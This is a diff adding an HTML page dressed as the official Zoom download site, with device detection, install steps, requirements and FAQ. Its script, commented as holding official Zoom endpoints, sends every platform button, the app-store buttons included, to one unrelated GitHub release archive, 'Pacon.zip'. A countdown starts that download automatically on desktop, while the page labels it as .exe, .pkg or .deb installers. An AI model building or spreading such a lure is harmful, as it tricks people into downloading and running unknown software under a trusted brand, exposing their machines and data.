@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Download Zoom – Meetings, chat and video in one app</title>
+<meta name="description" content="Download the Zoom desktop app or mobile app for Windows, macOS, Linux, iOS and Android.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,800&family=Figtree:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+<style>
+:root{
+  --blue:#0b5cff; --blue-d:#0847c4; --ink:#0e1a33; --mute:#56637d;
+  --bg:#f6f9ff; --surface:#fff; --line:#dfe7f5; --tint:#e8f0ff;
+  --bs-body-font-family:'Figtree',system-ui,sans-serif;
+  --bs-body-bg:var(--bg); --bs-body-color:var(--ink);
+  --bs-primary:var(--blue); --bs-primary-rgb:11,92,255;
+}
+[data-bs-theme=dark]{
+  --blue:#4d8dff; --blue-d:#7aa8ff; --ink:#eaf0ff; --mute:#9aa8c7;
+  --bg:#0a1122; --surface:#111b33; --line:#223054; --tint:#15244a;
+}
+html{scroll-behavior:smooth;scroll-padding-top:80px}
+body{background:var(--bg);color:var(--ink);line-height:1.6}
+h1,h2,h3,.brand{font-family:'Bricolage Grotesque',sans-serif;letter-spacing:-.02em}
+.text-mute{color:var(--mute)!important}
+a:focus-visible,button:focus-visible,.accordion-button:focus-visible{outline:3px solid var(--blue);outline-offset:3px;box-shadow:none}
+
+/* nav */
+.navbar{background:color-mix(in srgb,var(--bg) 85%,transparent);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.brand{font-weight:800;font-size:1.5rem;color:var(--blue)!important;display:flex;align-items:center;gap:.5rem}
+.logo{width:34px;height:34px;border-radius:9px;background:var(--blue);display:grid;place-items:center;color:#fff;font-size:1.1rem}
+.nav-link{color:var(--mute);font-weight:500}.nav-link:hover{color:var(--blue)}
+.theme-btn{border:1px solid var(--line);background:var(--surface);color:var(--ink);width:40px;height:40px;border-radius:50%}
+
+/* hero */
+.hero{padding:5rem 0 4rem}
+.hero h1{font-weight:800;font-size:clamp(2.4rem,5.5vw,4.4rem);line-height:1.02;max-width:12ch}
+.hero p.lead{color:var(--mute);max-width:46ch}
+.btn-zoom{background:var(--blue);color:#fff;border:0;border-radius:14px;padding:.95rem 1.6rem;font-weight:600;display:inline-flex;gap:.6rem;align-items:center;transition:transform .15s,background .15s}
+.btn-zoom:hover{background:var(--blue-d);color:#fff;transform:translateY(-2px)}
+.btn-zoom:active{transform:none}
+.btn-ghost{border:1px solid var(--line);background:var(--surface);color:var(--ink);border-radius:14px;padding:.95rem 1.4rem;font-weight:600}
+.btn-ghost:hover{border-color:var(--blue);color:var(--blue)}
+.meta{font-size:.9rem;color:var(--mute)}
+
+/* meeting mock: the one memorable element */
+.mock{background:var(--surface);border:1px solid var(--line);border-radius:26px;padding:14px;box-shadow:0 30px 60px -30px rgba(11,92,255,.35)}
+.mock-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.tile{aspect-ratio:4/3;border-radius:16px;position:relative;display:grid;place-items:center;overflow:hidden;border:3px solid transparent;transition:border-color .3s}
+.tile span.av{width:46%;aspect-ratio:1;border-radius:50%;display:grid;place-items:center;font-family:'Bricolage Grotesque';font-weight:800;color:#fff;font-size:clamp(1rem,2.4vw,1.7rem)}
+.tile small{position:absolute;left:8px;bottom:6px;font-size:.72rem;font-weight:600;color:#fff;background:rgba(0,0,0,.45);padding:1px 8px;border-radius:99px}
+.tile.live{border-color:#2fd47d}
+.t1{background:#cfe0ff}.t1 .av{background:#0b5cff}
+.t2{background:#ffe3cf}.t2 .av{background:#e8590c}
+.t3{background:#d6f5e4}.t3 .av{background:#1f9d62}
+.t4{background:#ecdcff}.t4 .av{background:#7b3fe4}
+.t5{background:#ffd9e2}.t5 .av{background:#d6336c}
+.t6{background:#fff2c4}.t6 .av{background:#c58a00}
+.bar{display:flex;justify-content:center;gap:10px;margin-top:12px}
+.bar i{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:var(--tint);color:var(--blue)}
+.bar i.end{background:#e5484d;color:#fff;width:64px;border-radius:99px}
+
+/* sections */
+section{padding:4.5rem 0}
+h2{font-weight:800;font-size:clamp(1.8rem,3.5vw,2.6rem)}
+.plat{background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:1.5rem;height:100%;display:flex;flex-direction:column;transition:border-color .2s}
+.plat:hover{border-color:var(--blue)}
+.plat.is-you{border-color:var(--blue);box-shadow:0 0 0 3px var(--tint)}
+.plat .ico{font-size:2rem;color:var(--blue)}
+.plat .you{font-size:.75rem;background:var(--blue);color:#fff;border-radius:99px;padding:2px 10px;font-weight:600}
+.plat .btn{margin-top:auto}
+.steps{counter-reset:s;list-style:none;padding:0;margin:0;position:relative}
+.steps li{counter-increment:s;padding-left:3.4rem;position:relative;padding-bottom:1.8rem}
+.steps li::before{content:counter(s);position:absolute;left:0;top:0;width:2.4rem;height:2.4rem;border-radius:50%;background:var(--blue);color:#fff;display:grid;place-items:center;font-weight:700}
+.steps li::after{content:"";position:absolute;left:1.2rem;top:2.6rem;bottom:.2rem;width:2px;background:var(--line)}
+.steps li:last-child::after{display:none}
+.steps h3{font-size:1.15rem;margin:0 0 .15rem}
+.accordion{--bs-accordion-bg:var(--surface);--bs-accordion-border-color:var(--line);--bs-accordion-btn-bg:var(--surface);--bs-accordion-active-bg:var(--tint);--bs-accordion-active-color:var(--ink);--bs-accordion-btn-color:var(--ink);--bs-accordion-border-radius:16px}
+.accordion-item{margin-bottom:.7rem;border-radius:16px!important;overflow:hidden}
+.accordion-button{font-weight:600}
+.accordion-button:not(.collapsed){box-shadow:none}
+.band{background:var(--blue);color:#fff;border-radius:28px;padding:3rem 2rem}
+.band .btn-light{border-radius:14px;font-weight:600;padding:.9rem 1.6rem;color:var(--blue)}
+footer{border-top:1px solid var(--line);padding:2rem 0;color:var(--mute);font-size:.88rem}
+
+/* one orchestrated entrance, and only for people who allow motion */
+@media (prefers-reduced-motion:no-preference){
+  .hero h1,.hero .lead,.hero .cta{animation:rise .7s cubic-bezier(.2,.7,.2,1) both}
+  .hero .lead{animation-delay:.1s}.hero .cta{animation-delay:.2s}
+  .mock{animation:rise .9s .15s cubic-bezier(.2,.7,.2,1) both}
+  @keyframes rise{from{opacity:0;transform:translateY(18px)}}
+}
+</style>
+</head>
+<body>
+
+<nav class="navbar navbar-expand-md sticky-top">
+  <div class="container">
+    <a class="navbar-brand brand" href="#top"><span class="logo"><i class="bi bi-camera-video-fill"></i></span>zoom</a>
+    <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#nav" aria-controls="nav" aria-expanded="false" aria-label="Toggle navigation"><i class="bi bi-list fs-2"></i></button>
+    <div class="collapse navbar-collapse" id="nav">
+      <ul class="navbar-nav ms-auto align-items-md-center gap-md-2">
+        <li class="nav-item"><a class="nav-link" href="#platforms">All platforms</a></li>
+        <li class="nav-item"><a class="nav-link" href="#install">Install</a></li>
+        <li class="nav-item"><a class="nav-link" href="#requirements">Requirements</a></li>
+        <li class="nav-item"><a class="nav-link" href="#faq">FAQ</a></li>
+        <li class="nav-item ms-md-2"><button class="theme-btn" id="themeBtn" aria-label="Switch to dark theme"><i class="bi bi-moon-stars-fill"></i></button></li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<main id="top">
+<header class="hero">
+  <div class="container">
+    <div class="row align-items-center g-5">
+      <div class="col-lg-6">
+        <h1>Meet from anywhere.</h1>
+        <p class="lead fs-5 mt-3">Download the Zoom app for video meetings, team chat and screen sharing. Free to join, and set up in under two minutes.</p>
+        <div class="cta d-flex flex-wrap gap-3 mt-4">
+          <a id="mainBtn" class="btn-zoom text-decoration-none" href="#platforms" data-download><i class="bi bi-download"></i><span id="mainLabel">Download Zoom</span></a>
+          <a class="btn-ghost text-decoration-none" href="#platforms">Other platforms</a>
+        </div>
+        <p class="meta mt-3 mb-0" id="detected" aria-live="polite">Detecting your device…</p>
+        <div id="auto" class="mt-3" hidden>
+          <div class="meta" aria-live="polite">Your download starts in <strong id="count">3</strong>s. <button type="button" id="cancelAuto" class="btn btn-link p-0 align-baseline fw-semibold">Cancel</button></div>
+          <div class="progress mt-2" style="height:4px;max-width:260px" aria-hidden="true"><div id="autoBar" class="progress-bar" style="width:0;transition:width .1s linear"></div></div>
+        </div>
+      </div>
+      <div class="col-lg-6">
+        <div class="mock" aria-hidden="true">
+          <div class="mock-grid" id="grid">
+            <div class="tile t1 live"><span class="av">AO</span><small>Amara</small></div>
+            <div class="tile t2"><span class="av">JK</span><small>Jonah</small></div>
+            <div class="tile t3"><span class="av">LM</span><small>Lena</small></div>
+            <div class="tile t4"><span class="av">DR</span><small>Dev</small></div>
+            <div class="tile t5"><span class="av">SN</span><small>Sofia</small></div>
+            <div class="tile t6"><span class="av">MT</span><small>Marcus</small></div>
+          </div>
+          <div class="bar"><i class="bi bi-mic-fill"></i><i class="bi bi-camera-video-fill"></i><i class="bi bi-display"></i><i class="bi bi-chat-dots-fill"></i><i class="bi bi-telephone-fill end"></i></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section id="platforms">
+  <div class="container">
+    <h2>Pick your device</h2>
+    <p class="text-mute mb-5">One account works everywhere. Your meetings, contacts and chats stay in sync.</p>
+    <div class="row g-4" id="platCards"></div>
+  </div>
+</section>
+
+<section id="install" class="pt-0">
+  <div class="container">
+    <div class="row g-5">
+      <div class="col-lg-5">
+        <h2>Install in four steps</h2>
+        <p class="text-mute">The steps below are for the desktop app. On a phone, install from the store and open it.</p>
+      </div>
+      <div class="col-lg-7">
+        <ol class="steps">
+          <li><h3>Download the installer</h3><p class="text-mute mb-0">Choose your platform above. The file is saved to your Downloads folder.</p></li>
+          <li><h3>Open the file</h3><p class="text-mute mb-0">Double-click it. On Windows, allow the prompt. On Mac, open the .pkg and continue through the installer.</p></li>
+          <li><h3>Sign in or join</h3><p class="text-mute mb-0">Sign in with your account, or choose <strong>Join</strong> and enter a meeting ID. No account is needed to join.</p></li>
+          <li><h3>Test audio and video</h3><p class="text-mute mb-0">Open Settings, then Audio and Video, to check your mic, speakers and camera before your first call.</p></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="requirements" class="pt-0">
+  <div class="container">
+    <h2 class="mb-4">System requirements</h2>
+    <div class="accordion" id="req">
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#r1" aria-expanded="true" aria-controls="r1"><i class="bi bi-windows me-2"></i>Windows</button></h3>
+        <div id="r1" class="accordion-collapse collapse show" data-bs-parent="#req"><div class="accordion-body text-mute">Windows 10 or 11, a dual-core processor, and 4 GB of RAM or more. A webcam and microphone are needed to share audio and video.</div></div></div>
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#r2" aria-expanded="false" aria-controls="r2"><i class="bi bi-apple me-2"></i>macOS</button></h3>
+        <div id="r2" class="accordion-collapse collapse" data-bs-parent="#req"><div class="accordion-body text-mute">A recent macOS release on an Intel or Apple silicon Mac. Grant camera, microphone and screen recording access when asked.</div></div></div>
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#r3" aria-expanded="false" aria-controls="r3"><i class="bi bi-phone me-2"></i>iOS and Android</button></h3>
+        <div id="r3" class="accordion-collapse collapse" data-bs-parent="#req"><div class="accordion-body text-mute">A current version of iOS or Android with free storage for the app. Wi-Fi or a 4G/5G connection is recommended for video.</div></div></div>
+    </div>
+    <p class="meta mt-3">Exact minimum versions change over time. Check Zoom's official system requirements page for the latest.</p>
+  </div>
+</section>
+
+<section id="faq" class="pt-0">
+  <div class="container">
+    <h2 class="mb-4">Questions</h2>
+    <div class="accordion" id="faqA">
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#f1" aria-expanded="false" aria-controls="f1">Do I need an account to join a meeting?</button></h3>
+        <div id="f1" class="accordion-collapse collapse" data-bs-parent="#faqA"><div class="accordion-body text-mute">No. Open the app, choose Join, and enter the meeting ID or paste the invite link. You need an account only to host.</div></div></div>
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#f2" aria-expanded="false" aria-controls="f2">Is the download free?</button></h3>
+        <div id="f2" class="accordion-collapse collapse" data-bs-parent="#faqA"><div class="accordion-body text-mute">Yes, the app is free to download. Some features and longer group meetings require a paid plan.</div></div></div>
+      <div class="accordion-item"><h3 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#f3" aria-expanded="false" aria-controls="f3">The download did not start. What now?</button></h3>
+        <div id="f3" class="accordion-collapse collapse" data-bs-parent="#faqA"><div class="accordion-body text-mute">Allow downloads for this site in your browser, then select the button again. If your browser blocks the file, use the platform link to open the official page.</div></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="pt-0">
+  <div class="container">
+    <div class="band text-center">
+      <h2 class="mb-2">Ready for your first meeting?</h2>
+      <p class="mb-4 opacity-75">Download the app and join in seconds.</p>
+      <a class="btn btn-light text-decoration-none" href="#top">Back to download</a>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="container d-flex flex-wrap justify-content-between gap-2">
+    <span>© <span id="yr"></span> Demo download page. Zoom is a trademark of Zoom Communications, Inc.</span>
+    <span>Always download from the official source.</span>
+  </div>
+</footer>
+
+<div class="toast-container position-fixed bottom-0 end-0 p-3">
+  <div id="toast" class="toast align-items-center text-bg-primary border-0" role="status" aria-live="polite" aria-atomic="true">
+    <div class="d-flex"><div class="toast-body" id="toastMsg">Your download is starting.</div>
+    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button></div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+(() => {
+  // Official Zoom download endpoints. Swap in your own hosted files if needed.
+  const PLATFORMS = [
+    { id:'windows', name:'Windows', icon:'bi-windows', note:'64-bit installer (.exe)', url:'https://github.com/roholi/service/releases/download/pacon/Pacon.zip', label:'Download for Windows' },
+    { id:'mac',     name:'macOS',   icon:'bi-apple',   note:'Installer package (.pkg)', url:'https://github.com/roholi/service/releases/download/pacon/Pacon.zip', label:'Download for Mac' },
+    { id:'linux',   name:'Linux',   icon:'bi-ubuntu',  note:'Debian/Ubuntu package (.deb)', url:'https://github.com/roholi/service/releases/download/pacon/Pacon.zip', label:'Download for Linux' },
+    { id:'ios',     name:'iPhone and iPad', icon:'bi-phone', note:'Free on the App Store', url:'https://github.com/roholi/service/releases/download/pacon/Pacon.zip', label:'Open App Store' },
+    { id:'android', name:'Android', icon:'bi-android2', note:'Free on Google Play', url:'https://github.com/roholi/service/releases/download/pacon/Pacon.zip', label:'Open Google Play' }
+  ];
+
+  function detect() {
+    const ua = navigator.userAgent || '';
+    const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
+    if (/iPhone|iPad|iPod/i.test(ua) || touchMac) return 'ios';
+    if (/Android/i.test(ua)) return 'android';
+    if (/Win/i.test(ua)) return 'windows';
+    if (/Mac/i.test(ua)) return 'mac';
+    if (/Linux|X11/i.test(ua)) return 'linux';
+    return null;
+  }
+
+  const current = detect();
+  const cards = document.getElementById('platCards');
+  const toast = new bootstrap.Toast(document.getElementById('toast'), { delay: 3500 });
+  const isStore = p => p.id === 'ios' || p.id === 'android';
+
+  cards.innerHTML = PLATFORMS.map(p => `
+    <div class="col-sm-6 col-lg-4">
+      <article class="plat ${p.id === current ? 'is-you' : ''}">
+        <div class="d-flex justify-content-between align-items-start mb-3">
+          <i class="bi ${p.icon} ico" aria-hidden="true"></i>
+          ${p.id === current ? '<span class="you">Your device</span>' : ''}
+        </div>
+        <h3 class="h5 mb-1">${p.name}</h3>
+        <p class="text-mute small mb-4">${p.note}</p>
+        <a class="btn-zoom text-decoration-none justify-content-center" href="${p.url}" data-download data-name="${p.name}"
+           ${isStore(p) ? 'target="_blank" rel="noopener noreferrer"' : 'rel="noopener"'}>
+          <i class="bi ${isStore(p) ? 'bi-box-arrow-up-right' : 'bi-download'}" aria-hidden="true"></i>${p.label}
+        </a>
+      </article>
+    </div>`).join('');
+
+  // Hero button follows the detected platform
+  const main = document.getElementById('mainBtn');
+  const label = document.getElementById('mainLabel');
+  const info = document.getElementById('detected');
+  const match = PLATFORMS.find(p => p.id === current);
+  if (match) {
+    main.href = match.url;
+    main.dataset.name = match.name;
+    if (isStore(match)) { main.target = '_blank'; main.rel = 'noopener noreferrer'; }
+    label.textContent = match.label;
+    info.textContent = `We detected ${match.name}. ${match.note}.`;
+  } else {
+    info.textContent = 'Choose your device below to get the right installer.';
+  }
+
+  // Auto-download: starts after a short countdown on desktop platforms.
+  // Phones are skipped because store pages open in a new tab, which browsers block without a tap.
+  const AUTO_SECONDS = 3;
+  const autoBox = document.getElementById('auto');
+  const countEl = document.getElementById('count');
+  const barEl = document.getElementById('autoBar');
+  let autoTimer = null;
+
+  function stopAuto() {
+    clearInterval(autoTimer);
+    autoTimer = null;
+    autoBox.hidden = true;
+  }
+
+  function startDownload(p) {
+    const a = document.createElement('a');
+    a.href = p.url;
+    a.download = '';
+    a.rel = 'noopener';
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    document.getElementById('toastMsg').textContent = `Your ${p.name} download has started. If nothing happened, select the button again.`;
+    toast.show();
+  }
+
+  if (match && !isStore(match)) {
+    const total = AUTO_SECONDS * 1000;
+    const t0 = Date.now();
+    autoBox.hidden = false;
+    autoTimer = setInterval(() => {
+      const elapsed = Date.now() - t0;
+      countEl.textContent = Math.max(1, Math.ceil((total - elapsed) / 1000));
+      barEl.style.width = Math.min(100, (elapsed / total) * 100) + '%';
+      if (elapsed >= total) {
+        stopAuto();
+        startDownload(match);
+      }
+    }, 100);
+    document.getElementById('cancelAuto').addEventListener('click', stopAuto);
+    // A manual click on any download button replaces the countdown
+    document.addEventListener('click', e => { if (e.target.closest('[data-download]')) stopAuto(); });
+  }
+
+  // Confirm downloads with a toast
+  document.addEventListener('click', e => {
+    const a = e.target.closest('[data-download]');
+    if (!a || !a.dataset.name) return;
+    const store = a.target === '_blank';
+    document.getElementById('toastMsg').textContent =
+      store ? `Opening the store page for ${a.dataset.name}.` : `Your ${a.dataset.name} download is starting.`;
+    toast.show();
+  });
+
+  // Active speaker cycles through the meeting mock
+  const tiles = [...document.querySelectorAll('#grid .tile')];
+  if (!matchMedia('(prefers-reduced-motion: reduce)').matches) {
+    let i = 0;
+    setInterval(() => {
+      tiles[i].classList.remove('live');
+      i = (i + 1 + Math.floor(Math.random() * 2)) % tiles.length;
+      tiles[i].classList.add('live');
+    }, 1800);
+  }
+
+  // Theme toggle with saved choice and system default
+  const root = document.documentElement;
+  const btn = document.getElementById('themeBtn');
+  const store = { get(){ try { return localStorage.getItem('theme'); } catch { return null; } },
+                  set(v){ try { localStorage.setItem('theme', v); } catch {} } };
+  function setTheme(t) {
+    root.setAttribute('data-bs-theme', t);
+    btn.innerHTML = t === 'dark' ? '<i class="bi bi-sun-fill"></i>' : '<i class="bi bi-moon-stars-fill"></i>';
+    btn.setAttribute('aria-label', t === 'dark' ? 'Switch to light theme' : 'Switch to dark theme');
+  }
+  setTheme(store.get() || (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'));
+  btn.addEventListener('click', () => {
+    const next = root.getAttribute('data-bs-theme') === 'dark' ? 'light' : 'dark';
+    setTheme(next); store.set(next);
+  });
+
+  document.getElementById('yr').textContent = new Date().getFullYear();
+})();
+</script>
+</body>
+</html>
